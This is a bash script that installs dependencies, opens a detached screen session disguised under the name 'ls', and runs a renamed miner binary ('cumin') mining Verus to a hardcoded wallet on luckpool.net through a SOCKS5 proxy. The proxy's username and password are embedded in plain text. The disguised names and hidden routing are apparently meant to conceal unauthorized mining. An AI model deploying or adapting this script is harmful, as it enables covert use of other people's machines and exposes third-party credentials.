#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621
WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
PROXY=socks5://NhBMm3oA:4yOC49q4v@lax.socks.ipvanish.com:1080
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
